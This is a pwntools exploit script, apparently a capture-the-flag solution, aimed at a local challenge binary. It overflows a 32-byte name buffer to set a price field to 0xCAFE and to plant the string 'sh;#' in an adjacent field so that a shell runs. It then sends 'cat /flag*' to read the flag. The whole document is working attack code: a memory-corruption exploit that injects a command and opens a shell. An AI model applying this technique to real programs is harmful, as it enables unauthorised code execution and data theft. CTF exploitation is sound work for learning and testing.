#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"
context.os = "linux"
if args.GDB or args.LOCAL:
    context.binary = ELF("./chall")

PRICE_OFF = 32
BREW_OFF = 36

if args.GDB:
    p = gdb.debug(context.binary.path, '''
        b *main+0
        c
    ''')
elif args.LOCAL:
    p = process(aslr=True)
else:
    p = remote("localhost", 1337)

# Overflow name[32] through price (must be 0) into the first 4 bytes of brew.
payload = flat({
    PRICE_OFF: p32(0xCAFE),
    BREW_OFF: b'sh;#',
})

p.sendafter(b'Name: ', payload)
p.clean(0.5)
p.sendline(b"cat /flag*")
print(p.clean(0.5).decode())
